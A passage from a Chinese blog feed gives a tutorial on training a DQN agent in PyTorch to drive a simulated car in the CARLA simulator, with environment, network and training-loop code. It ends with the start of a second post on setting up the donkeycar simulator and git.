class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> abc</span><br><span class="line"><span class="keyword">import</span> glob</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> types <span class="keyword">import</span> LambdaType</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> namedtuple</span><br><span class="line"> </span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    sys.path.append(glob.glob(<span class="string">&#x27;../carla/dist/carla-*%d.%d-%s.egg&#x27;</span> % (</span><br><span class="line">        sys.version_info.major,</span><br><span class="line">        sys.version_info.minor,</span><br><span class="line">        <span class="string">&#x27;win-amd64&#x27;</span> <span class="keyword">if</span> os.name == <span class="string">&#x27;nt&#x27;</span> <span class="keyword">else</span> <span class="string">&#x27;linux-x86_64&#x27;</span>))[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">except</span> IndexError:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> carla</span><br><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"> </span><br><span class="line">IM_WIDTH = <span class="number">80</span></span><br><span class="line">IM_HEIGHT = <span class="number">60</span></span><br><span class="line">SHOW_PREVIEW = <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">SECOND_PER_EPISODE = <span class="number">10</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Car_Env</span>():</span><br><span class="line">    SHOW_CAM = SHOW_PREVIEW</span><br><span class="line">    STEER_AMT = <span class="number">1.0</span></span><br><span class="line">    im_width = IM_WIDTH</span><br><span class="line">    im_height = IM_HEIGHT</span><br><span class="line">    front_camera = <span class="literal">None</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.client = carla.Client(<span class="string">&#x27;localhost&#x27;</span>,<span class="number">2000</span>)</span><br><span class="line">        self.client.set_timeout(<span class="number">10.0</span>)</span><br><span class="line">        self.world = self.client.get_world()</span><br><span class="line">        self.blueprint_library = self.world.get_blueprint_library()</span><br><span class="line">        self.model_3 = self.blueprint_library.<span class="built_in">filter</span>(<span class="string">&#x27;model3&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">reset</span>(<span class="params">self</span>):</span><br><span class="line">        self.collision_hist = []</span><br><span class="line">        self.radar_hist = []</span><br><span class="line">        self.actor_list = []</span><br><span class="line">        self.transform = self.world.get_map().get_spawn_points()[<span class="number">100</span>] <span class="comment">#spwan_points共265个点，选第一个点作为初始化小车的位置</span></span><br><span class="line">        self.vehicle = self.world.spawn_actor(self.model_3 , self.transform)</span><br><span class="line"> </span><br><span class="line">        self.actor_list.append(self.vehicle)</span><br><span class="line"> </span><br><span class="line">        self.rgb_cam = self.blueprint_library.find(<span class="string">&#x27;sensor.camera.rgb&#x27;</span>)</span><br><span class="line">        self.rgb_cam.set_attribute(<span class="string">&#x27;image_size_x&#x27;</span>,<span class="string">f&#x27;<span class="subst">&#123;self.im_width&#125;</span>&#x27;</span>)</span><br><span class="line">        self.rgb_cam.set_attribute(<span class="string">&#x27;image_size_y&#x27;</span>,<span class="string">f&#x27;<span class="subst">&#123;self.im_height&#125;</span>&#x27;</span>)</span><br><span class="line">        self.rgb_cam.set_attribute(<span class="string">&#x27;fov&#x27;</span>,<span class="string">f&#x27;110&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">        transform = carla.Transform(carla.Location(x=<span class="number">2.5</span> ,z=<span class="number">0.7</span> ))</span><br><span class="line">        self.sensor = self.world.spawn_actor(self.rgb_cam,transform, attach_to=self.vehicle)</span><br><span class="line">        self.actor_list.append(self.sensor)</span><br><span class="line">        self.sensor.listen(<span class="keyword">lambda</span> data: self.process_img(data))</span><br><span class="line"> </span><br><span class="line">        self.vehicle.apply_control(carla.VehicleControl(throttle=<span class="number">0.0</span>, brake=<span class="number">0.0</span>))</span><br><span class="line">        </span><br><span class="line">        time.sleep(<span class="number">4</span>)</span><br><span class="line"> </span><br><span class="line">       </span><br><span class="line">        <span class="comment">#collision sensor</span></span><br><span class="line">        colsensor = self.blueprint_library.find(<span class="string">&#x27;sensor.other.collision&#x27;</span>)</span><br><span class="line">        self.colsensor = self.world.spawn_actor(colsensor, transform, attach_to = self.vehicle)</span><br><span class="line">        self.actor_list.append(self.colsensor)</span><br><span class="line">        self.colsensor.listen(<span class="keyword">lambda</span> event: self.collision_data(event))</span><br><span class="line">       </span><br><span class="line"> </span><br><span class="line">        <span class="comment">#target_transform 定义驾驶目的地坐标</span></span><br><span class="line">        self.target_transform = self.world.get_map().get_spawn_points()[<span class="number">101</span>]</span><br><span class="line">        self.target_dis = self.target_transform.location.distance(self.vehicle.get_location())</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">while</span> self.front_camera <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            time.sleep(<span class="number">0.01</span>)</span><br><span class="line"> </span><br><span class="line">        self.episode_start = time.time()</span><br><span class="line">        self.vehicle.apply_control(carla.VehicleControl(throttle=<span class="number">0.0</span>, brake=<span class="number">0.0</span>))</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">return</span> self.front_camera</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">collision_data</span>(<span class="params">self, event</span>):</span><br><span class="line">        self.collision_hist.append(event)</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">radar_data</span>(<span class="params">self, mesure</span>):</span><br><span class="line">        self.radar_hist.append(mesure)</span><br><span class="line">                </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_img</span>(<span class="params">self, image</span>):</span><br><span class="line">        i = np.array(image.raw_data)</span><br><span class="line">        i2 = i.reshape((self.im_height, self.im_width , <span class="number">4</span>))</span><br><span class="line">        i3 = i2[: , : , : <span class="number">3</span>]</span><br><span class="line">        <span class="keyword">if</span> self.SHOW_CAM:</span><br><span class="line">            cv2.imshow(<span class="string">&quot;&quot;</span>,i3)</span><br><span class="line">            cv2.waitKey(<span class="number">1</span>)</span><br><span class="line">        self.front_camera = i3</span><br><span class="line">        <span class="keyword">return</span> i3/<span class="number">255.0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">step</span>(<span class="params">self, action</span>):</span><br><span class="line">        last_dis = self.target_dis  </span><br><span class="line">        <span class="keyword">if</span> action==<span class="number">0</span>:            </span><br><span class="line">            self.vehicle.apply_control(carla.VehicleControl(throttle=<span class="number">1.0</span>, steer=<span class="number">0.0</span>, brake=<span class="number">0.0</span>, hand_brake=<span class="literal">False</span>, reverse=<span class="literal">False</span>))</span><br><span class="line">        <span class="keyword">elif</span> action==<span class="number">1</span>:</span><br><span class="line">            self.vehicle.apply_control(carla.VehicleControl(throttle=<span class="number">0.5</span>, steer=-<span class="number">1</span>, brake=<span class="number">0.0</span>, hand_brake=<span class="literal">False</span>, reverse=<span class="literal">False</span>))</span><br><span class="line">        <span class="keyword">elif</span> action==<span class="number">2</span>:</span><br><span class="line">            self.vehicle.apply_control(carla.VehicleControl(throttle=<span class="number">0.5</span>, steer=<span class="number">1</span>, brake=<span class="number">0.0</span>, hand_brake=<span class="literal">False</span>, reverse=<span class="literal">False</span>))</span><br><span class="line">        <span class="keyword">elif</span> action==<span class="number">4</span>:</span><br><span class="line">            self.vehicle.apply_control(carla.VehicleControl(throttle=<span class="number">0.0</span>, steer=<span class="number">0.0</span>, brake=<span class="number">0.5</span>, hand_brake=<span class="literal">False</span>, reverse=<span class="literal">False</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.vehicle.apply_control(carla.VehicleControl(throttle=<span class="number">1.0</span>, steer=<span class="number">0.0</span>, brake=<span class="number">0.0</span>, hand_brake=<span class="literal">False</span>, reverse=<span class="literal">True</span>))</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        self.target_dis = self.target_transform.location.distance(self.vehicle.get_location())  </span><br><span class="line">                       </span><br><span class="line">        v = self.vehicle.get_velocity()</span><br><span class="line">        kmh = <span class="built_in">int</span>(<span class="number">3.6</span> * math.sqrt(v.x**<span class="number">2</span> + v.y**<span class="number">2</span> + v.z**<span class="number">2</span>))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(self.collision_hist)!=<span class="number">0</span>:</span><br><span class="line">            done = <span class="literal">True</span></span><br><span class="line">            reward = -<span class="number">200</span></span><br><span class="line">        <span class="keyword">elif</span> last_dis &lt; self.target_dis:  <span class="comment">#距离目标越来越远了</span></span><br><span class="line">            done = <span class="literal">False</span></span><br><span class="line">            reward = -<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            done = <span class="literal">False</span></span><br><span class="line">            reward = <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> self.episode_start + SECOND_PER_EPISODE &lt; time.time():</span><br><span class="line">            done = <span class="literal">True</span></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> self.front_camera, reward, done, <span class="literal">None</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>定义好环境后我们就可以开始定义DQN网络了，选择pytorch框架。在训练之前，还要开辟一个存储空间，用来保存小车每次和环境交互的数据(push_memory()函数)，每次训练都从buffer中随机抽取batch_size的样本(get_sample()函数)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">from</span> torch.autograd <span class="keyword">import</span> Variable</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> torch.optim <span class="keyword">as</span> optim</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> torchvision.transforms <span class="keyword">as</span> T</span><br><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> FloatTensor, LongTensor, ByteTensor</span><br><span class="line">Tensor = FloatTensor</span><br><span class="line"> </span><br><span class="line">EPSILON = <span class="number">0.9</span>       <span class="comment"># epsilon used for epsilon greedy approach</span></span><br><span class="line">GAMMA = <span class="number">0.9</span></span><br><span class="line">TARGET_NETWORK_REPLACE_FREQ = <span class="number">100</span>       <span class="comment"># How frequently target netowrk updates</span></span><br><span class="line">MEMORY_CAPACITY = <span class="number">200</span></span><br><span class="line">BATCH_SIZE = <span class="number">32</span></span><br><span class="line">LR = <span class="number">0.01</span>           <span class="comment"># learning rate</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Net</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(Net, self).__init__()</span><br><span class="line">        self.conv1 = nn.Conv2d(<span class="number">3</span>, <span class="number">16</span>, kernel_size=<span class="number">5</span>, stride=<span class="number">2</span>)</span><br><span class="line">        self.bn1 = nn.BatchNorm2d(<span class="number">16</span>)</span><br><span class="line">        self.conv2 = nn.Conv2d(<span class="number">16</span>, <span class="number">32</span>, kernel_size=<span class="number">5</span>, stride=<span class="number">2</span>)</span><br><span class="line">        self.bn2 = nn.BatchNorm2d(<span class="number">32</span>)</span><br><span class="line">        self.conv3 = nn.Conv2d(<span class="number">32</span>, <span class="number">32</span>, kernel_size=<span class="number">5</span>, stride=<span class="number">2</span>)</span><br><span class="line">        self.bn3 = nn.BatchNorm2d(<span class="number">32</span>)</span><br><span class="line">        self.head = nn.Linear(<span class="number">896</span>,<span class="number">5</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = F.relu(self.bn1(self.conv1(x)))  <span class="comment"># 一层卷积</span></span><br><span class="line">        x = F.relu(self.bn2(self.conv2(x)))  <span class="comment"># 两层卷积</span></span><br><span class="line">        x = F.relu(self.bn3(self.conv3(x)))  <span class="comment"># 三层卷积</span></span><br><span class="line">        <span class="keyword">return</span> self.head(x.view(x.size(<span class="number">0</span>),-<span class="number">1</span>)) <span class="comment"># 全连接层 </span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DQN</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.eval_net,self.target_net = Net(),Net()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Define counter, memory size and loss function</span></span><br><span class="line">        self.learn_step_counter = <span class="number">0</span> <span class="comment"># count the steps of learning process        </span></span><br><span class="line"> </span><br><span class="line">        self.memory = []</span><br><span class="line">        self.position = <span class="number">0</span> <span class="comment"># counter used for experience replay buff        </span></span><br><span class="line">        self.capacity = <span class="number">200</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">#------- Define the optimizer------#</span></span><br><span class="line">        self.optimizer = torch.optim.Adam(self.eval_net.parameters(), lr=LR)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># ------Define the loss function-----#</span></span><br><span class="line">        self.loss_func = nn.MSELoss()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span>  <span class="title function_">choose_action</span>(<span class="params">self, x</span>):</span><br><span class="line">        <span class="comment"># This function is used to make decision based upon epsilon greedy</span></span><br><span class="line">        </span><br><span class="line">        x = torch.unsqueeze(torch.FloatTensor(x), <span class="number">0</span>) <span class="comment"># add 1 dimension to input state x</span></span><br><span class="line">        x = x.permute(<span class="number">0</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>)  <span class="comment">#把图片维度从[batch, height, width, channel] 转为[batch, channel, height, width]</span></span><br><span class="line">        <span class="comment"># input only one sample</span></span><br><span class="line">        <span class="keyword">if</span> np.random.uniform() &lt; EPSILON:   <span class="comment"># greedy</span></span><br><span class="line">            <span class="comment"># use epsilon-greedy approach to take action</span></span><br><span class="line">            actions_value = self.eval_net.forward(x)</span><br><span class="line">            <span class="comment">#print(torch.max(actions_value, 1)) </span></span><br><span class="line">            <span class="comment"># torch.max() returns a tensor composed of max value along the axis=dim and corresponding index</span></span><br><span class="line">            <span class="comment"># what we need is the index in this function, representing the action of cart.</span></span><br><span class="line">            action = torch.<span class="built_in">max</span>(actions_value, <span class="number">1</span>)[<span class="number">1</span>].data.numpy()</span><br><span class="line">            action = action[<span class="number">0</span>]</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            action = np.random.randint(<span class="number">0</span>, <span class="number">5</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> action</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">push_memory</span>(<span class="params">self, s, a, r, s_</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(self.memory) &lt; self.capacity:</span><br><span class="line">            self.memory.append(<span class="literal">None</span>)</span><br><span class="line">        self.memory[self.position] = Transition(torch.unsqueeze(torch.FloatTensor(s), <span class="number">0</span>),torch.unsqueeze(torch.FloatTensor(s_), <span class="number">0</span>),\</span><br><span class="line">                                                torch.from_numpy(np.array([a])),torch.from_numpy(np.array([r],dtype=<span class="string">&#x27;int64&#x27;</span>)))</span><br><span class="line">        self.position = (self.position + <span class="number">1</span>) % self.capacity</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_sample</span>(<span class="params">self,batch_size</span>):</span><br><span class="line">        <span class="keyword">return</span> random.sample(self.memory, batch_size)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">learn</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># Define how the whole DQN works including sampling batch of experiences,</span></span><br><span class="line">        <span class="comment"># when and how to update parameters of target network, and how to implement</span></span><br><span class="line">        <span class="comment"># backward propagation.</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># update the target network every fixed steps</span></span><br><span class="line">        <span class="keyword">if</span> self.learn_step_counter % TARGET_NETWORK_REPLACE_FREQ == <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># Assign the parameters of eval_net to target_net</span></span><br><span class="line">            self.target_net.load_state_dict(self.eval_net.state_dict())</span><br><span class="line">        self.learn_step_counter += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        transitions = self.get_sample(BATCH_SIZE)  <span class="comment"># 抽样</span></span><br><span class="line">        batch = Transition(*<span class="built_in">zip</span>(*transitions))</span><br><span class="line"> </span><br><span class="line">        <span class="comment"># extract vectors or matrices s,a,r,s_ from batch memory and convert these to torch Variables</span></span><br><span class="line">        <span class="comment"># that are convenient to back propagation</span></span><br><span class="line">        b_s = Variable(torch.cat(batch.state))</span><br><span class="line">        <span class="comment"># convert long int type to tensor</span></span><br><span class="line">        b_a = Variable(torch.cat(batch.action))</span><br><span class="line">        b_r = Variable(torch.cat(batch.reward))</span><br><span class="line">        b_s_ = Variable(torch.cat(batch.next_state))</span><br><span class="line">        </span><br><span class="line"> </span><br><span class="line">        <span class="comment">#b_s和b_s_分别对应当前帧和下一帧的图像数据，变量的维度是80*60*3(x*y*rgb_channel)，但进入神经网络需将其维度变为3*80*60</span></span><br><span class="line">        b_s = b_s.permute(<span class="number">0</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>)  </span><br><span class="line">        b_s_ = b_s_.permute(<span class="number">0</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>)        </span><br><span class="line">        </span><br><span class="line">        <span class="comment"># calculate the Q value of state-action pair</span></span><br><span class="line">        q_eval = self.eval_net(b_s).gather(<span class="number">1</span>,b_a.unsqueeze(<span class="number">1</span>)) <span class="comment"># (batch_size, 1)</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment"># calculate the q value of next state</span></span><br><span class="line">        q_next = self.target_net(b_s_).detach() <span class="comment"># detach from computational graph, don&#x27;t back propagate</span></span><br><span class="line">        <span class="comment"># select the maximum q value</span></span><br><span class="line">        <span class="comment"># q_next.max(1) returns the max value along the axis=1 and its corresponding index</span></span><br><span class="line">        q_target = b_r + GAMMA * q_next.<span class="built_in">max</span>(<span class="number">1</span>)[<span class="number">0</span>].view(BATCH_SIZE, <span class="number">1</span>) <span class="comment"># (batch_size, 1)</span></span><br><span class="line">        loss = self.loss_func(q_eval, q_target)</span><br><span class="line">        </span><br><span class="line">        self.optimizer.zero_grad() <span class="comment"># reset the gradient to zero</span></span><br><span class="line">        loss.backward()</span><br><span class="line">        self.optimizer.step() <span class="comment"># execute back propagation for one step</span></span><br><span class="line">        </span><br><span class="line">Transition = namedtuple(<span class="string">&#x27;Transition&#x27;</span>,(<span class="string">&#x27;state&#x27;</span>, <span class="string">&#x27;next_state&#x27;</span>,<span class="string">&#x27;action&#x27;</span>, <span class="string">&#x27;reward&#x27;</span>))</span><br></pre></td></tr></table></figure><p>之后添加主函数，模型便可以开始训练。每次和环境交互时选择action，一定概率是模型的输出结果，一定概率是随机选择，可以通过阈值设定(EPSILON)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    env=Car_Env()</span><br><span class="line">    s=env.reset()</span><br><span class="line">    dqn=DQN()</span><br><span class="line">    count=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">        a=dqn.choose_action(s)</span><br><span class="line">        s_,r,done,info = env.step(a)</span><br><span class="line">        dqn.push_memory(s, a, r, s_)    </span><br><span class="line">        s=s_    </span><br><span class="line">        <span class="keyword">if</span> (dqn.position % (MEMORY_CAPACITY-<span class="number">1</span>) )== <span class="number">0</span>:</span><br><span class="line">            dqn.learn()</span><br><span class="line">            count+=<span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;learned times:&#x27;</span>,count)</span><br></pre></td></tr></table></figure><p>运行主函数后，我们就可以看到小车在道路中反复做出各种action以便探索环境。</p><p> 但是现在的模型还很基础，神经网络对驾驶的控制也远没达到智能，需要经过成千上万次的训练，或者增加传感器或摄像头数据的丰富度，才有可能训练出达到驾驶要求的DQN网络。愿意做下去的同学上github找好的模型或好的paper复现。千万不要硬跑这个模型，我们的电脑跑起来是没有止境的。</p><p>那么这个小教程就到这里了。还有很多不是很完善的地方，以后我会慢慢完善或出视频。感谢看到这里，希望对大家有所帮助。</p><p>参考文献：</p><p><a href="https://blog.csdn.net/weixin_44169614/article/details/118681651">使用CARLA模拟器实现DQN自动驾驶</a></p><p><a href="https://blog.csdn.net/weixin_44169614/article/details/121444571">DQN自动驾驶——python+gym实现</a></p><p><a href="https://zhuanlan.zhihu.com/p/108286901">【强化学习】Deep Q-Network (DQN) - 知乎 (zhihu.com)</a></p><p><a href="http://carla.org/">carla.org</a></p><p><a href="https://www.carla.org.cn/#/">Carla 中文站</a></p><p><a href="https://zhuanlan.zhihu.com/p/365732535">CARLA完全实践-核心概念 - 知乎 (zhihu.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>基于深度学习的端到端自动驾驶</title>
      <link href="/2024/02/04/%E5%9F%BA%E4%BA%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E7%AB%AF%E5%88%B0%E7%AB%AF%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6/"/>
      <url>/2024/02/04/%E5%9F%BA%E4%BA%8E%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E7%AB%AF%E5%88%B0%E7%AB%AF%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="基于深度学习的端到端自动驾驶"><a href="#基于深度学习的端到端自动驾驶" class="headerlink" title="基于深度学习的端到端自动驾驶"></a>基于深度学习的端到端自动驾驶</h1><p>主体来源:<a href="https://blog.csdn.net/qianbin3200896/article/details/119832583">钱斌的博客</a> </p><h2 id="1-模拟平台安装和基本使用"><a href="#1-模拟平台安装和基本使用" class="headerlink" title="1.模拟平台安装和基本使用"></a>1.模拟平台安装和基本使用</h2><h3 id="1-1模拟器的安装"><a href="#1-1模拟器的安装" class="headerlink" title="1.1模拟器的安装"></a>1.1模拟器的安装</h3><p>下载地址：<a href="https://github.com/tawnkramer/gym-donkeycar/releases">右键或点击此处</a>或按住ctrl+&#x2F;进入代码模式，复制链接到浏览器打开。</p><p>该地址中提供的模拟器是基于Unity开发的，是经过删减过后的可执行程序，不再需要额外安装unity，下载下来后就可以直接运行。目前覆盖windows、Linux、Mac共3个版本。以下只讲解如何在windows平台上运行和使用该模拟器。</p><p>下载完成后运行donkey_sim.exe文件即可进入模拟器。左边是设置，根据自己的需要进行设置即可。</p><p>在场景中，如果我们前面主界面使用了手工模式（paceCar处勾选manualDriving），那么我们就可以通过键盘来操控小车进行体验了。与一般的赛车游戏类似，W键表示前进，A表示左转，D表示右转，S表示后退。</p><p>在该模拟器中，控制小车的主要是两个参数：油门（W和S键）和转向角度（A和D键），这个与我们真实驾驶的汽车基本一致：挂挡+踩油门来控制前进动力，打方向盘控制车辆转向。为了能够实现自动驾驶，我们首先要能够根据这两个参数去控制模拟器里面小车的运行。我们怎么样通过Python代码来控制这个模拟器呢？</p><h3 id="1-2git工具的安装与配置"><a href="#1-2git工具的安装与配置" class="headerlink" title="1.2git工具的安装与配置"></a>1.2git工具的安装与配置</h3><p>详细的git工具安装与教程请参照<a href="https://blog.csdn.net/mukes/article/details/115693833">这篇文章</a>，这里仅描述如何在pycharm中使用git</p><h4 id="1-2-1注册github账号"><a href="#1-2-1注册github账号" class="headerlink" title="1.2.1注册github账号"></a>1.2.1注册github账号</h4><p> <a href="https://github.com/">GitHub官网</a> 按照提示进行注册。请注意记下用户名和邮箱地址，下面步骤需要使用。</p><h4 id="1-2-2安装git"><a href="#1-2-2安装git" class="headerlink" title="1.2.2安装git"></a>1.2.2安装git</h4><p> <a href="https://git-scm.com/">到git官网下载git安装包</a>，点击downloads，选择操作平台(windows)，下载完成后运行，第一次选择全勾，后面一直下一步即可。</p><p>下载完成后，运行cmd，输入命令检查下载版本。能正确显示版本即为安装成功</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git version</span><br></pre></td></tr></table></figure><h4 id="1-2-3配置git"><a href="#1-2-3配置git" class="headerlink" 